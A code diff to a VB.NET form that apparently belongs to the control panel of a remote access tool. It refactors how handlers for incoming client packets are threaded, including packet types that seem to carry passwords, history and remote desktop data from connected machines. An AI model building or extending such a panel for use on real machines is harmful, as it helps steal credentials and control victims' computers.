@@ -155,9 +155,6 @@ Public Class Form1
 
 
             Task.Run(Sub() R(Y, Y.C.GetStream, port))
-         '   Dim Buffer = New Byte(0) {}
-
-            '     Y.C.Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
 
             Task.Run(Sub() Helpers.Sender(Y, p))
 
@@ -187,10 +184,9 @@ Public Class Form1
                         Task.Run(Sub() Countries.GetFlags(C.C.Client.RemoteEndPoint.ToString, ImageList1, AeroListView1, packet.Misc, Port))
 
                     Case PacketType.PW
-                        C.SetPW(packet.Misc)
-                        '    Dim T As New Thread(Sub() )
-                    '    T.Start()
-                    ' Task.Run(Sub() C.SetPW(packet.Misc))
+
+                        Dim T As New Thread(Sub() C.SetPW(packet.Misc))
+                        T.Start()
 
                     Case PacketType.HIST
 
@@ -224,9 +220,7 @@ Public Class Form1
                     Case PacketType.RD
 
                         ThreadPool.QueueUserWorkItem(Sub() C.SetRD(packet.Misc))
-                        '   Dim T As New Thread(Sub() C.SetRD(packet.Misc))
-                        '       T.Start()
-                        '  Await Task.Run(Sub() C.SetRD(packet.Misc))
+
                 End Select
 
             Catch ex As Exception
@@ -293,27 +287,7 @@ Public Class Form1
             Next
         End If
     End Sub
-    Public Function File_Data()
-        '  Using H As New OpenFileDialog
-        '   If H.ShowDialog() = DialogResult.OK Then
-        '       Return New Object() {H.SafeFileName, IO.File.ReadAllBytes(H.FileName)}
-        '   End If
-        '   P.Function_Params = New Object() {Packet_Subject.WALLPAPER, OpenFileDialog1.SafeFileName, IO.File.ReadAllBytes(OpenFileDialog1.FileName)}
-        'End Using
-
-
-        Dim P As New OpenFileDialog
-        P.InitialDirectory = Application.StartupPath
-        P.ShowDialog()
-        '   Dim LK As New Thread(Sub()
-        '   Task.Run(Sub() P.ShowDialog())
-        '    End Sub)
-        '     LK.Start()
-    End Function
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
-
-        'IO.File.WriteAllBytes("Test", Plugins._WB)
-
         If IO.File.Exists("Settings.ini") Then
 
             Dim P As String() = Split(IO.File.ReadAllText("Settings.ini"), ",")
